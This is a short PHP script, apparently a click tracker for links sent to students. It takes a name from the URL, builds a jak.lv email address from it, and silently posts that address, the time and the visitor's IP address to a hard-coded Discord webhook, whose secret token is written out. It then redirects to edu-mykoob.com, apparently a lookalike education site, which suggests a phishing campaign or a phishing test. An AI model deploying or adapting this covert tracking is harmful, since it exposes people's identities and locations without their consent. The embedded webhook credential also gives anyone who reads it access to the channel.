<?php
// /t/index.php - Handles all student tracking links

// Get student identifier from URL path
$path = $_SERVER['REQUEST_URI'];
$parts = explode('/', trim($path, '/'));
$student = end($parts);

// Validate student name (only allow safe characters)
if (!preg_match('/^[a-zA-Z0-9_.-]+$/', $student)) {
    $student = 'unknown';
}

// Send to Discord webhook
$webhook = 'https://discord.com/api/webhooks/1546873236837507194/lmRQFwn2BMjakNFUd6d1OJLQ-bd-VaMT2kcBsXblxIXs9zvl5rDs-0bB8UGwMtgj4FoO';

$data = [
    'content' => "👆 **Saites atvēršana**\n📧 E-pasts: {$student}@jak.lv\n🕐 Laiks: " . date('Y-m-d H:i:s') . "\n🌐 IP: " . ($_SERVER['REMOTE_ADDR'] ?? 'unknown')
];

// Send to Discord (fire and forget)
$ch = curl_init($webhook);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 2); // Don't wait long
curl_exec($ch);
curl_close($ch);

// Redirect to clean homepage
header('Location: https://edu-mykoob.com/');
exit;
?>
